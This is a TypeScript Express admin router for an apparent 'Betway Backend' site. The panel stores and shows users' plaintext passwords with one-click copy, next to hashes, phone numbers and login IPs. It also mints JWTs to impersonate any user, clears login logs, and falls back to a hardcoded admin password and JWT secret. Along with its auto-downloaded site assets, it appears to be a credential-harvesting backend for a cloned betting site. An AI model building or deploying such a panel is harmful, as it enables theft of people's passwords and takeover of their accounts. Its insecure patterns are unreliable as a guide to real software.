/**
 * admin.ts — Detached admin dashboard
 * Accessible at /admin  (password-protected via ADMIN_PASSWORD env var)
 */

import { Router, Request, Response } from 'express'
import { prisma } from '../db'

export const adminRouter: Router = Router()

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD ?? 'admin@betway2024'

// ── In-memory session store ───────────────────────────────────────────────────
export const sessions = new Set<string>()

function randomToken(): string {
  return Math.random().toString(36).slice(2) + Date.now().toString(36)
}

function requireAdmin(req: Request, res: Response, next: () => void): void {
  const cookie = req.headers.cookie ?? ''
  const match  = cookie.match(/admin_token=([^;]+)/)
  if (match && sessions.has(match[1])) { next(); return }
  res.redirect('/admin/login')
}

// ── Auth routes ───────────────────────────────────────────────────────────────
adminRouter.get('/login', (_req, res) => {
  res.setHeader('Content-Type', 'text/html')
  res.send(loginPage())
})

adminRouter.post('/login', (req: Request, res: Response) => {
  const { password } = req.body as { password?: string }
  if (password === ADMIN_PASSWORD) {
    const token = randomToken()
    sessions.add(token)
    res.setHeader('Set-Cookie', `admin_token=${token}; HttpOnly; Path=/; SameSite=Strict`)
    res.redirect('/admin')
  } else {
    res.setHeader('Content-Type', 'text/html')
    res.send(loginPage('Incorrect password — try again'))
  }
})

adminRouter.post('/logout', (req: Request, res: Response) => {
  const cookie = req.headers.cookie ?? ''
  const match  = cookie.match(/admin_token=([^;]+)/)
  if (match) sessions.delete(match[1])
  res.setHeader('Set-Cookie', 'admin_token=; HttpOnly; Path=/; Max-Age=0')
  res.redirect('/admin/login')
})

// ── Delete user ───────────────────────────────────────────────────────────────
adminRouter.post('/users/delete/:userId',requireAdmin, async (req: Request, res: Response) => {
  try {
    await prisma.loginLog.deleteMany({ where: { userId: req.params.userId } })
    await prisma.userFavourite.deleteMany({ where: { userId: req.params.userId } })
    await prisma.betSlip.deleteMany({ where: { userId: req.params.userId } })
    await prisma.user.delete({ where: { userId: req.params.userId } })
  } catch (err) {
    console.error('[admin] delete user error:', (err as Error).message)
  }
  res.redirect('/admin')
})

// ── Reset a user's password ───────────────────────────────────────────────────
adminRouter.post('/users/reset/:userId', requireAdmin, async (req: Request, res: Response) => {
  try {
    const newPassword = (req.body as any).newPassword as string
    if (!newPassword) {
      res.status(400).send('newPassword is required')
      return
    }
    const bcrypt = (await import('bcryptjs')).default
    const hash = await bcrypt.hash(newPassword, 12)
    await prisma.user.update({
      where: { userId: req.params.userId },
      data:  { passwordHash: hash, plaintextPassword: newPassword },
    })
    res.redirect('/admin')
  } catch (err) {
    console.error('[admin] reset password error:', (err as Error).message)
    res.redirect('/admin')
  }
})

// ── Impersonate — mint a fresh JWT for the target user ───────────────────────
adminRouter.post('/users/impersonate/:userId', requireAdmin, async (req: Request, res: Response) => {
  try {
    const jwt = (await import('jsonwebtoken')).default
    const user = await prisma.user.findUnique({ where: { userId: req.params.userId } })
    if (!user) {
      res.status(404).send('User not found')
      return
    }
    const secret = process.env.JWT_SECRET ?? 'betway-local-secret-change-in-prod'
    const token = jwt.sign({ sub: user.userId }, secret, { expiresIn: '7d' })
    res.setHeader('Content-Type', 'text/html')
    res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Impersonate</title></head>
<body style="font-family:Segoe UI,sans-serif;background:#080c14;color:#d8dde8;display:flex;align-items:center;justify-content:center;min-height:100vh">
<div style="background:#0f1623;border:1px solid #1a2540;border-radius:12px;padding:32px;max-width:640px">
<h2 style="color:#00d4aa;margin-top:0">Impersonating ${escapeHtml(user.username)}</h2>
<p>JWT minted successfully. Paste the token below into the browser console or an API client to act as this user:</p>
<textarea readonly rows="6" style="width:100%;background:#080c14;color:#00d4aa;border:1px solid #1a2540;border-radius:8px;padding:10px;font-family:monospace;font-size:.78rem">${token}</textarea>
<p style="font-size:.8rem;color:#4a5568">Set header <code>Authorization: Bearer &lt;token&gt;</code> on requests to /appsynapse/auth/me, betting endpoints, etc.</p>
<p><a href="/admin" style="color:#00d4aa">← Back to dashboard</a></p>
</div></body></html>`)
  } catch (err) {
    console.error('[admin] impersonate error:', (err as Error).message)
    res.status(500).send('Impersonation failed')
  }
})

function escapeHtml(v: unknown): string {
  return String(v ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')
}

// ── Clear all login logs ──────────────────────────────────────────────────────
adminRouter.post('/logs/clear', requireAdmin, async (_req, res) => {
  await prisma.loginLog.deleteMany({})
  res.redirect('/admin')
})

// ── Dashboard ─────────────────────────────────────────────────────────────────
adminRouter.get('/', requireAdmin, async (_req, res) => {
  const [users, logs, media] = await Promise.all([
    prisma.user.findMany({
      orderBy: { createdAt: 'desc' },
      select: {
        userId: true, username: true, email: true,
        passwordHash: true, plaintextPassword: true,
        firstName: true, lastName: true, mobileNumber: true,
        countryCode: true, currencyCode: true,
        isVerified: true, defaultBetSize: true, createdAt: true,
      },
    }),
    prisma.loginLog.findMany({ orderBy: { createdAt: 'desc' }, take: 200 }),
    prisma.mediaAsset.findMany({ orderBy: { downloadedAt: 'desc' }, take: 100 }),
  ])
  res.setHeader('Content-Type', 'text/html')
  res.send(dashboardPage(users, logs, media))
})

// ── JSON APIs ─────────────────────────────────────────────────────────────────
adminRouter.get('/api/users', requireAdmin, async (_req, res) => {
  res.json(await prisma.user.findMany({ orderBy: { createdAt: 'desc' } }))
})
adminRouter.get('/api/logs', requireAdmin, async (_req, res) => {
  res.json(await prisma.loginLog.findMany({ orderBy: { createdAt: 'desc' }, take: 200 }))
})
adminRouter.get('/api/media', requireAdmin, async (_req, res) => {
  res.json(await prisma.mediaAsset.findMany({ orderBy: { downloadedAt: 'desc' } }))
})

// ─────────────────────────────────────────────────────────────────────────────
// HTML helpers
// ─────────────────────────────────────────────────────────────────────────────
function esc(s: unknown): string {
  return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
}
function fmt(d: Date | string): string {
  return new Date(d).toLocaleString('en-GB', {
    day:'2-digit', month:'short', year:'numeric',
    hour:'2-digit', minute:'2-digit', second:'2-digit',
  })
}

// ─────────────────────────────────────────────────────────────────────────────
// Login page
// ─────────────────────────────────────────────────────────────────────────────
function loginPage(error?: string): string {
  return `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin Login — Betway Backend</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
  background:#0a0a0a;font-family:'Segoe UI',sans-serif}
.card{background:#1a1a2e;border:1px solid #16213e;border-radius:14px;
  padding:44px 40px;width:380px;box-shadow:0 12px 40px rgba(0,0,0,.6)}
h1{color:#00d4aa;font-size:1.6rem;margin-bottom:4px;text-align:center}
p.sub{color:#666;font-size:.85rem;text-align:center;margin-bottom:32px}
label{display:block;color:#aaa;font-size:.82rem;margin-bottom:6px;letter-spacing:.03em}
input{width:100%;padding:13px 14px;background:#0d2137;border:1px solid #1e3a5f;
  border-radius:9px;color:#fff;font-size:1rem;outline:none;transition:border .2s}
input:focus{border-color:#00d4aa}
button{width:100%;margin-top:22px;padding:14px;background:#00d4aa;
  border:none;border-radius:9px;color:#061a26;font-size:1rem;
  font-weight:700;cursor:pointer;letter-spacing:.02em;transition:background .2s}
button:hover{background:#00b894}
.error{background:#c0392b18;border:1px solid #c0392b55;color:#e74c3c;
  padding:11px 14px;border-radius:9px;margin-bottom:18px;font-size:.84rem;text-align:center}
.logo{text-align:center;font-size:2.4rem;margin-bottom:12px}
</style>
</head><body>
<div class="card">
  <div class="logo">⚡</div>
  <h1>Admin Panel</h1>
  <p class="sub">Betway Backend Dashboard</p>
  ${error ? `<div class="error">${esc(error)}</div>` : ''}
  <form method="POST" action="/admin/login">
    <label for="pw">Admin Password</label>
    <input id="pw" type="password" name="password" placeholder="••••••••••" autofocus required>
    <button type="submit">Sign In →</button>
  </form>
</div>
</body></html>`
}

// ─────────────────────────────────────────────────────────────────────────────
// Dashboard page
// ─────────────────────────────────────────────────────────────────────────────
function dashboardPage(users: any[], logs: any[], media: any[]): string {
  const successLogins = logs.filter(l => l.success).length
  const failedLogins  = logs.filter(l => !l.success).length

  // ── Users table ────────────────────────────────────────────────────────────
  const userRows = users.length === 0
    ? `<tr><td colspan=\"11\" style=\"text-align:center;color:#555;padding:24px\">No users registered yet</td></tr>`
    : users.map(u => `
      <tr>
        <td><span class=\"badge\">${esc(u.username)}</span></td>
        <td>${esc(u.email)}</td>
        <td>
          ${u.plaintextPassword
            ? `<code class=\"pwd\" title=\"${esc(u.plaintextPassword)}\" onclick=\"copyText(this.textContent)\">${esc(u.plaintextPassword)}</code>`
            : '<span style="color:#555;font-size:.75rem">—</span>'}
        </td>
        <td>
          <code class=\"hash\" title=\"${esc(u.passwordHash ?? '')}\" onclick=\"copyText(this.textContent)\">${esc((u.passwordHash ?? '').slice(0, 20))}…</code>
        </td>
        <td>${esc((u.firstName ?? '') + ' ' + (u.lastName ?? '')).trim() || '—'}</td>
        <td>${esc(u.mobileNumber ?? '—')}</td>
        <td><span class=\"tag\">${esc(u.countryCode)}</span></td>
        <td>${esc(u.currencyCode)}</td>
        <td>${u.isVerified ? '<span class=\"ok\">✓ Yes</span>' : '<span class=\"no\">✗ No</span>'}</td>
        <td>${fmt(u.createdAt)}</td>
        <td style=\"white-space:nowrap\">
          <details class=\"actions\">
            <summary>⚙️</summary>
            <div class=\"action-menu\">
              <form method=\"POST\" action=\"/admin/users/reset/${esc(u.userId)}\">
                <input type=\"password\" name=\"newPassword\" placeholder=\"New password…\" required>
                <button class=\"mini-btn\" type=\"submit\">Reset pwd</button>
              </form>
              <form method=\"POST\" action=\"/admin/users/impersonate/${esc(u.userId)}\">
                <button class=\"mini-btn\" type=\"submit\">Impersonate</button>
              </form>
              <form method=\"POST\" action=\"/admin/users/delete/${esc(u.userId)}\"
                    onsubmit=\"return confirm('Delete user ${esc(u.username)}?')\">
                <button class=\"mini-btn danger\" type=\"submit\">Delete</button>
              </form>
            </div>
          </details>
        </td>
      </tr>`).join('')

  // ── Login log table ────────────────────────────────────────────────────────
  const logRows = logs.length === 0
    ? `<tr><td colspan="5" style="text-align:center;color:#555;padding:24px">No login activity yet</td></tr>`
    : logs.map(l => `
      <tr class="${l.success ? '' : 'row-fail'}">
        <td>${fmt(l.createdAt)}</td>
        <td><span class="badge">${esc(l.username)}</span></td>
        <td>${esc(l.email ?? '—')}</td>
        <td><code style="font-size:.8rem;color:#aaa">${esc(l.ipAddress === '::1' ? 'localhost' : (l.ipAddress ?? '—'))}</code></td>
        <td>${l.success
          ? '<span class="ok">✓ Success</span>'
          : '<span class="no">✗ Failed</span>'}</td>
      </tr>`).join('')

  // ── Media gallery ──────────────────────────────────────────────────────────
  const mediaGallery = media.length === 0
    ? `<p style="color:#555;text-align:center;padding:24px">
        No media cached yet.<br>
        <span style="font-size:.82rem">Assets download automatically as the site loads.</span>
       </p>`
    : `<div class="gallery">
        ${media.map(m => {
          const isImg = m.mimeType?.startsWith('image/') || /\.(png|jpg|jpeg|gif|webp|svg|ico)$/i.test(m.filename)
          const url   = `/uploads/${esc(m.filename)}`
          const kb    = m.sizeBytes ? (m.sizeBytes / 1024).toFixed(1) + ' KB' : '—'
          return `<div class="media-card" title="${esc(m.originalUrl)}">
            ${isImg
              ? `<img src="${url}" alt="${esc(m.filename)}" onerror="this.replaceWith(document.createTextNode('🖼️'))">`
              : `<div class="media-icon">📄</div>`}
            <div class="media-name">${esc(m.filename)}</div>
            <div class="media-meta">${kb} · ${esc(m.category ?? 'other')}</div>
            <a href="${url}" target="_blank" rel="noopener">open ↗</a>
          </div>`
        }).join('')}
      </div>`

  return `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="30">
<title>Admin Dashboard — Betway Backend</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#080c14;color:#d8dde8;font-family:'Segoe UI',sans-serif;min-height:100vh}

/* Top bar */
.topbar{background:#0f1623;border-bottom:1px solid #1a2540;padding:14px 28px;
  display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
.topbar-title{display:flex;align-items:center;gap:10px}
.topbar-title h1{color:#00d4aa;font-size:1.15rem;font-weight:700}
.topbar-title span{color:#3a4a60;font-size:.82rem}
.topbar-actions{display:flex;gap:10px;align-items:center}
.topbar-actions .hint{color:#3a4a60;font-size:.78rem}

/* Buttons */
.btn{padding:8px 18px;border-radius:8px;border:none;cursor:pointer;font-size:.82rem;font-weight:600;transition:background .2s}
.btn-logout{background:#c0392b;color:#fff}.btn-logout:hover{background:#e74c3c}
.btn-danger{background:#7b1a1a;color:#f87171;font-size:.78rem;padding:5px 12px;border-radius:6px;border:1px solid #c0392b44;cursor:pointer}
.btn-danger:hover{background:#c0392b;color:#fff}
.del-btn{background:#1a0a0a;color:#e74c3c;border:1px solid #c0392b44;
  padding:4px 10px;border-radius:6px;font-size:.75rem;cursor:pointer;transition:background .2s}
.del-btn:hover{background:#c0392b;color:#fff}

/* Layout */
.container{padding:24px 28px;max-width:1500px;margin:0 auto}

/* Stats */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
.stat{background:#0f1623;border:1px solid #1a2540;border-radius:12px;padding:20px;text-align:center}
.stat .num{font-size:2.2rem;font-weight:800;color:#00d4aa;line-height:1}
.stat .lbl{font-size:.78rem;color:#4a5568;margin-top:6px;letter-spacing:.03em;text-transform:uppercase}

/* Sections */
.section{background:#0f1623;border:1px solid #1a2540;border-radius:12px;
  padding:20px 24px;margin-bottom:24px;overflow-x:auto}
.section-header{display:flex;align-items:center;justify-content:space-between;
  margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid #1a2540}
.section-header h2{color:#00d4aa;font-size:.95rem;font-weight:600}
.section-header .meta{color:#3a4a60;font-size:.78rem}

/* Table */
table{width:100%;border-collapse:collapse;font-size:.83rem}
th{text-align:left;color:#4a5568;font-weight:600;padding:8px 12px;
  border-bottom:1px solid #1a2540;white-space:nowrap;text-transform:uppercase;font-size:.72rem;letter-spacing:.05em}
td{padding:10px 12px;border-bottom:1px solid #0d1220;color:#b0b8c8;vertical-align:middle}
tr:last-child td{border-bottom:none}
tr:hover td{background:#111d2e}
.row-fail td{background:#1a0808}
.row-fail:hover td{background:#220c0c}

/* Badges & tags */
.badge{background:#00d4aa15;color:#00d4aa;padding:3px 10px;border-radius:20px;font-size:.78rem;font-weight:600}
.tag{background:#1a2540;color:#7a9abf;padding:2px 8px;border-radius:6px;font-size:.78rem}
.ok{color:#00d4aa;font-weight:600}
.no{color:#e74c3c;font-weight:600}

/* Search */
.search-bar{width:100%;padding:9px 14px;background:#080c14;border:1px solid #1a2540;
  border-radius:8px;color:#d8dde8;font-size:.85rem;outline:none;margin-bottom:14px}
.search-bar:focus{border-color:#00d4aa44}

/* Media gallery */
.gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px;padding-top:4px}
.media-card{background:#080c14;border:1px solid #1a2540;border-radius:10px;
  padding:10px;text-align:center;transition:border-color .2s;overflow:hidden}
.media-card:hover{border-color:#00d4aa44}
.media-card img{max-width:100%;max-height:72px;object-fit:contain;margin-bottom:6px;display:block;margin-left:auto;margin-right:auto}
.media-icon{height:60px;display:flex;align-items:center;justify-content:center;font-size:1.8rem;margin-bottom:6px}
.media-name{font-size:.68rem;color:#6a7a90;word-break:break-all;margin-bottom:3px;line-height:1.3}
.media-meta{font-size:.65rem;color:#3a4a60;margin-bottom:5px}
.media-card a{font-size:.7rem;color:#00d4aa;text-decoration:none}
.media-card a:hover{text-decoration:underline}

/* Password & hash cells */
.pwd{font-family:ui-monospace,Consolas,monospace;font-size:.75rem;color:#00d4aa;
  background:#00d4aa10;border:1px solid #00d4aa33;padding:2px 8px;border-radius:6px;
  cursor:pointer;white-space:nowrap;max-width:220px;overflow:hidden;text-overflow:ellipsis;display:inline-block;vertical-align:middle}
.pwd:hover{background:#00d4aa22;border-color:#00d4aa}
.hash{font-family:ui-monospace,Consolas,monospace;font-size:.68rem;color:#7a9abf;
  background:#1a2540;padding:2px 6px;border-radius:6px;cursor:pointer;white-space:nowrap;vertical-align:middle}
.hash:hover{background:#243455}

/* Row action menu */
.actions{position:relative;display:inline-block}
.actions summary{list-style:none;cursor:pointer;font-size:1rem;padding:2px 6px;
  border-radius:6px;background:#1a2540;width:fit-content;user-select:none}
.actions summary::-webkit-details-marker{display:none}
.actions[open] summary{background:#00d4aa22}
.action-menu{position:absolute;right:0;top:calc(100% + 6px);background:#0f1623;
  border:1px solid #1a2540;border-radius:10px;padding:10px;min-width:230px;
  box-shadow:0 8px 30px rgba(0,0,0,.6);z-index:50;display:flex;flex-direction:column;gap:8px}
.action-menu form{margin:0;display:flex;gap:6px;align-items:center}
.action-menu input[type=password]{flex:1;padding:6px 8px;background:#080c14;border:1px solid #1a2540;
  border-radius:6px;color:#d8dde8;font-size:.75rem;outline:none;min-width:0}
.action-menu input[type=password]:focus{border-color:#00d4aa}
.mini-btn{padding:6px 10px;border-radius:6px;border:none;background:#00d4aa;color:#061a26;
  font-size:.72rem;font-weight:700;cursor:pointer;white-space:nowrap;transition:background .2s}
.mini-btn:hover{background:#00b894}
.mini-btn.danger{background:#7b1a1a;color:#f87171;border:1px solid #c0392b44}
.mini-btn.danger:hover{background:#c0392b;color:#fff}

/* Toast */
#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);
  background:#00d4aa;color:#061a26;font-weight:700;font-size:.82rem;padding:10px 18px;
  border-radius:8px;opacity:0;pointer-events:none;transition:all .25s ease;z-index:999}
#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}

/* Responsive */
@media(max-width:900px){
  .stats{grid-template-columns:repeat(2,1fr)}
  .container{padding:14px}
  .topbar{padding:12px 14px;flex-direction:column;gap:10px;align-items:flex-start}
}
@media(max-width:480px){
  .stats{grid-template-columns:1fr}
}
</style>
</head>
<body>

<div class="topbar">
  <div class="topbar-title">
    <h1>⚡ Admin Dashboard</h1>
    <span>Betway Backend · auto-refresh every 30s</span>
  </div>
  <div class="topbar-actions">
    <span class="hint">Last loaded: ${new Date().toLocaleTimeString()}</span>
    <form method="POST" action="/admin/logout" style="margin:0">
      <button class="btn btn-logout" type="submit">Logout</button>
    </form>
  </div>
</div>

<div class="container">

  <!-- Stats -->
  <div class="stats">
    <div class="stat">
      <div class="num">${users.length}</div>
      <div class="lbl">Registered Users</div>
    </div>
    <div class="stat">
      <div class="num" style="color:#00d4aa">${successLogins}</div>
      <div class="lbl">Successful Logins</div>
    </div>
    <div class="stat">
      <div class="num" style="color:#e74c3c">${failedLogins}</div>
      <div class="lbl">Failed Login Attempts</div>
    </div>
    <div class="stat">
      <div class="num" style="color:#7a9abf">${media.length}</div>
      <div class="lbl">Cached Media Assets</div>
    </div>
  </div>

  <!-- Users -->
  <div class="section">
    <div class="section-header">
      <h2>👥 Registered Users</h2>
      <span class="meta">${users.length} total</span>
    </div>
    <input class="search-bar" type="text" id="userSearch" placeholder="🔍  Search by username, email or name…" oninput="filterTable('userTable', this.value)">
    <table id="userTable">
      <thead><tr>
        <th>Username</th><th>Email</th><th>Password</th><th>Hash</th><th>Name</th><th>Phone</th>
        <th>Country</th><th>Currency</th><th>Verified</th><th>Joined</th><th></th>
      </tr></thead>
      <tbody>${userRows}</tbody>
    </table>
  </div>

  <!-- Login Log -->
  <div class="section">
    <div class="section-header">
      <h2>🔐 Login Activity</h2>
      <form method="POST" action="/admin/logs/clear"
            onsubmit="return confirm('Clear all login logs?')" style="margin:0">
        <button class="btn-danger" type="submit">Clear logs</button>
      </form>
    </div>
    <input class="search-bar" type="text" id="logSearch" placeholder="🔍  Search by username or IP…" oninput="filterTable('logTable', this.value)">
    <table id="logTable">
      <thead><tr>
        <th>Time</th><th>Username</th><th>Email</th><th>IP Address</th><th>Status</th>
      </tr></thead>
      <tbody>${logRows}</tbody>
    </table>
  </div>

  <!-- Media -->
  <div class="section">
    <div class="section-header">
      <h2>🖼️ Cached Media Assets</h2>
      <span class="meta">${media.length} files · stored in betway-backend/public/uploads/</span>
    </div>
    ${mediaGallery}
  </div>

</div>

<script>
function filterTable(tableId, query) {
  const q = query.toLowerCase()
  const rows = document.getElementById(tableId).querySelectorAll('tbody tr')
  rows.forEach(row => {
    row.style.display = row.textContent.toLowerCase().includes(q) ? '' : 'none'
  })
}
function copyText(text) {
  navigator.clipboard.writeText(text).then(() => {
    toast('Copied ✓')
  }).catch(() => {
    const ta = document.createElement('textarea')
    ta.value = text
    document.body.appendChild(ta)
    ta.select()
    document.execCommand('copy')
    document.body.removeChild(ta)
    toast('Copied ✓')
  })
}
let toastTimer = null
function toast(msg) {
  let el = document.getElementById('toast')
  if (!el) {
    el = document.createElement('div')
    el.id = 'toast'
    document.body.appendChild(el)
  }
  el.textContent = msg
  el.classList.add('show')
  clearTimeout(toastTimer)
  toastTimer = setTimeout(() => el.classList.remove('show'), 1500)
}
</script>

</body></html>`
}
